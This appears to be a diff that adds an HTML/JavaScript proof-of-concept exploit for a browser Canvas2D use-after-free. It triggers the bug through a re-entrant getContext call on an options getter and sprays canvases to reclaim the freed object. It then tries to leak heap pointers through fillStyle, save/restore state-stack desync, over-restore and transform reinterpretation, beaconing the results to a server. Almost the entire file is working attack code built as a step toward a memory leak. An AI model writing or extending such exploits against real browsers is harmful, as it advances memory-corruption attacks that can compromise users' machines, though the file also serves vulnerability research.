@@ -1,0 +1,297 @@
+<!--
+  p678: Canvas2D UAF info leak via CanvasPattern/CanvasGradient fillStyle
+  
+  CONFIRMED from p677: spray[11] reclaims the freed slot. Stale reads work.
+  
+  New approach: Instead of reading simple numeric props (lineWidth),
+  use properties that store C++ object references internally:
+  
+  1. CanvasGradient — createLinearGradient() returns a JS wrapper around
+     a C++ CanvasGradient object. Setting fillStyle=gradient stores a Ref<>
+     in the canvas state. Reading fillStyle back returns the object.
+     The INTERNAL representation has a raw pointer to the gradient.
+  
+  2. CanvasPattern — createPattern() similarly stores a C++ pointer.
+  
+  3. ImageData — putImageData + getImageData cycle through backing store
+  
+  4. Path2D — might leak structure pointers
+  
+  5. The KEY insight: we control spray[11] AND read through stale.
+     If we set spray[11].fillStyle = gradient, then stale.fillStyle returns
+     the same gradient object (no leak there). BUT if we can make the
+     stale wrapper read from a DIFFERENT offset (by manipulating save count
+     or state stack), it might read adjacent heap memory as a fillStyle
+     pointer, giving us a raw heap address.
+  
+  6. ALTERNATIVE: setTransform on spray[11] with specific values, then
+     read getTransform through stale. The transform is stored as 6 doubles
+     in the state stack. If we can shift the state stack read offset by
+     manipulating save/restore through the stale wrapper, we read adjacent
+     memory as doubles. With DAZ ON, only non-denormal values survive.
+     BUT if the adjacent memory contains a pointer whose double
+     representation is NOT denormal (many kernel/heap addresses are
+     normal doubles when reinterpreted), we see the value.
+  
+  7. DOUBLE REINTERPRETATION: A pointer like 0x7f1234567890 as a float64:
+     sign=0, exp=0x7F1, mantissa=234567890... = a normal double ~1e+304
+     This would survive DAZ! Only pointers with exp=0x000 (denormals) 
+     get flushed. Most heap pointers have non-zero high bytes → normal doubles.
+  
+  CRASH_CLASS: MEDIUM (reading through reclaimed object, might crash on 
+  misaligned state stack access)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p678</title></head>
+<body>p678: Canvas2D UAF pattern/gradient leak
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P678-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
+
+var f64=new Float64Array(1),u8f=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8f[i].toString(16)).slice(-2);return h;}
+function isPointerLike(hex){
+  // Check if hex looks like a heap/text pointer
+  var hi=hex.slice(0,8);
+  return hi!=='00000000'&&hi!=='ffffffff'&&hex!=='0000000000000000'&&
+         hex!=='3ff0000000000000'&&hex!=='0000000000000000';
+}
+
+emit('START','v1');flush();
+var retained=[];
+
+// ================================================================
+// PHASE A: Trigger UAF + spray (same as p677)
+// ================================================================
+emit('A','uaf-trigger+spray');
+var staleCtx=null,sprayCtxs=[],sprayCanvases=[];
+try{
+  var oc=document.createElement('canvas');oc.width=4;oc.height=4;
+  document.body.appendChild(oc);
+  var triggered=false,innerCtx=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){
+    if(!triggered){triggered=true;innerCtx=oc.getContext('2d');}
+    return true;
+  }});
+  oc.getContext('bitmaprenderer',opts);
+  staleCtx=innerCtx;
+  
+  // Spray
+  for(var i=0;i<500;i++){
+    var c=document.createElement('canvas');c.width=4;c.height=4;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=100+i;
+    ctx.globalAlpha=0.5+i*0.0001;
+    sprayCanvases.push(c);sprayCtxs.push(ctx);retained.push(c);
+  }
+  
+  // Verify alias
+  var lw=staleCtx.lineWidth;
+  var aliasIdx=Math.round(lw-100);
+  emit('A-ALIAS','spray['+aliasIdx+'] lw='+lw);
+  if(lw<100||lw>=600){emit('A-FAIL','no alias');flush();return;}
+}catch(e){emit('A-ERR',e.message);flush();return;}
+flush();
+
+var aliasCtx=sprayCtxs[Math.round(staleCtx.lineWidth-100)];
+var aliasCanvas=sprayCanvases[Math.round(staleCtx.lineWidth-100)];
+
+// ================================================================
+// PHASE B: Set gradient as fillStyle on the alias context
+// Then read through stale — what comes back?
+// ================================================================
+emit('B','gradient-fillstyle');
+try{
+  var grad=aliasCtx.createLinearGradient(0,0,100,100);
+  grad.addColorStop(0,'red');
+  grad.addColorStop(1,'blue');
+  aliasCtx.fillStyle=grad;
+  
+  // Read through stale
+  var fs=staleCtx.fillStyle;
+  emit('B-TYPE',typeof fs);
+  emit('B-VALUE',String(fs).slice(0,80));
+  emit('B-IS-GRADIENT',(fs instanceof CanvasGradient));
+  emit('B-SAME-REF',(fs===grad));
+  
+  // If it's a string, check for anything unusual
+  if(typeof fs==='string'){
+    emit('B-STRING-HEX','');
+    for(var i=0;i<Math.min(fs.length,20);i++){
+      emit('B-CHAR',i+'=0x'+fs.charCodeAt(i).toString(16));
+    }
+  }
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Set CanvasPattern as fillStyle
+// ================================================================
+emit('C','pattern-fillstyle');
+try{
+  // Create a small canvas as pattern source
+  var pc=document.createElement('canvas');pc.width=2;pc.height=2;
+  var pctx=pc.getContext('2d');
+  pctx.fillStyle='#FF0000';pctx.fillRect(0,0,2,2);
+  
+  var pat=aliasCtx.createPattern(pc,'repeat');
+  aliasCtx.fillStyle=pat;
+  
+  var fs2=staleCtx.fillStyle;
+  emit('C-TYPE',typeof fs2);
+  emit('C-VALUE',String(fs2).slice(0,80));
+  emit('C-IS-PATTERN',(fs2 instanceof CanvasPattern));
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: State stack offset walk via save/restore desync
+// 
+// spray[11] has 0 saves (m_unrealizedSaveCount=0, m_stateStack.size=1)
+// If we do save() through STALE, it increments spray[11]'s count
+// Then read lineWidth through STALE — should still be 111
+// But if we then call restore() through ALIAS (not stale), 
+// the counts desync and stale might read from wrong state stack offset
+// ================================================================
+emit('D','state-desync');
+try{
+  // Reset alias to known values
+  aliasCtx.lineWidth=200;
+  aliasCtx.setTransform(1,0,0,1,0,0);
+  
+  // Verify through stale
+  emit('D-BASELINE','lw='+staleCtx.lineWidth);
+  
+  // Save through stale multiple times
+  for(var i=0;i<10;i++) staleCtx.save();
+  emit('D-AFTER-SAVE','lw='+staleCtx.lineWidth);
+  
+  // Change lineWidth through alias AFTER saves
+  aliasCtx.lineWidth=300;
+  emit('D-ALIAS-CHANGED','alias_lw='+aliasCtx.lineWidth+' stale_lw='+staleCtx.lineWidth);
+  
+  // Restore through stale — should pop state stack
+  for(var i=0;i<10;i++){
+    try{
+      staleCtx.restore();
+      var lwNow=staleCtx.lineWidth;
+      if(lwNow!==200&&lwNow!==300){
+        emit('D-ANOMALY','restore['+i+'] lw='+lwNow+' hex='+d2hex(lwNow));
+      }
+    }catch(e){emit('D-RESTORE-ERR',i+':'+e.message);break;}
+  }
+  emit('D-FINAL','lw='+staleCtx.lineWidth);
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE E: Over-restore — restore MORE than we saved
+// This might read past the state stack into adjacent memory
+// ================================================================
+emit('E','over-restore');
+try{
+  // Set known state
+  aliasCtx.lineWidth=400;
+  aliasCtx.setTransform(1,0,0,1,0,0);
+  
+  // Save 2 through stale
+  staleCtx.save();staleCtx.save();
+  
+  // Restore 5 through stale — 3 extra restores
+  for(var i=0;i<5;i++){
+    try{
+      staleCtx.restore();
+      var lw=staleCtx.lineWidth;
+      var ga=staleCtx.globalAlpha;
+      var t=staleCtx.getTransform();
+      emit('E-R'+i,'lw='+lw+' ga='+ga+' t.a='+d2hex(t.a)+' t.e='+d2hex(t.e));
+      if(lw!==400){
+        emit('E-LEAK?','lw='+lw+' hex='+d2hex(lw)+' ← unexpected value!');
+      }
+      if(t.a!==1||t.e!==0){
+        emit('E-TLEAK?','a='+d2hex(t.a)+' b='+d2hex(t.b)+' e='+d2hex(t.e)+' f='+d2hex(t.f));
+      }
+    }catch(e){emit('E-ERR-R'+i,e.message);break;}
+  }
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE F: Massive save through stale, then read getTransform
+// Many saves push the state stack — the Vector<State> might realloc
+// The NEW buffer address is a heap pointer stored in m_stateStack
+// ================================================================
+emit('F','massive-save');
+try{
+  aliasCtx.lineWidth=500;
+  // Save 100 times through stale — force Vector<State> reallocation
+  for(var i=0;i<100;i++){
+    try{staleCtx.save();}catch(e){emit('F-SAVE-ERR',i+':'+e.message);break;}
+  }
+  emit('F-SAVED','100');
+  
+  // Read transform — m_stateStack.last() now reads from the reallocated buffer
+  try{
+    var t=staleCtx.getTransform();
+    emit('F-TRANSFORM','a='+d2hex(t.a)+' b='+d2hex(t.b)+' c='+d2hex(t.c)+' d='+d2hex(t.d)+' e='+d2hex(t.e)+' f='+d2hex(t.f));
+    
+    // Check each for pointer-like values
+    var vals={a:t.a,b:t.b,c:t.c,d:t.d,e:t.e,f:t.f};
+    for(var name in vals){
+      var hex=d2hex(vals[name]);
+      if(isPointerLike(hex)){
+        emit('F-PTR?',name+'='+hex+' val='+vals[name]);
+      }
+    }
+  }catch(e){emit('F-TRANSFORM-ERR',e.message);}
+  
+  // lineWidth after massive save
+  try{
+    var lw=staleCtx.lineWidth;
+    emit('F-LW','lw='+lw+' hex='+d2hex(lw));
+  }catch(e){emit('F-LW-ERR',e.message);}
+  
+  // Restore all
+  for(var i=0;i<100;i++){try{staleCtx.restore();}catch(e){break;}}
+}catch(e){emit('F-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE G: fillRect through stale, then getImageData through alias
+// Draw on the backing store THROUGH the stale context
+// Then read pixels through the alias — what do we see?
+// ================================================================
+emit('G','cross-draw');
+try{
+  // Set stale fillStyle to a known color
+  staleCtx.fillStyle='#DEADBE';
+  staleCtx.fillRect(0,0,4,4);
+  
+  // Read pixels through ALIAS context
+  var img=aliasCtx.getImageData(0,0,4,4);
+  var px=img.data;
+  var sample=[];
+  for(var i=0;i<Math.min(64,px.length);i++) sample.push(('0'+px[i].toString(16)).slice(-2));
+  emit('G-PIXELS',sample.join('').slice(0,128));
+  
+  // Any non-zero non-DEADBE?
+  var unexpected=0;
+  for(var i=0;i<px.length;i+=4){
+    if(px[i]===0xDE&&px[i+1]===0xAD&&px[i+2]===0xBE)continue;
+    if(px[i]===0&&px[i+1]===0&&px[i+2]===0&&px[i+3]===0)continue;
+    unexpected++;
+  }
+  emit('G-UNEXPECTED',unexpected);
+}catch(e){emit('G-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p678-complete');flush();
+})();
+</script>
+</body>
+</html>
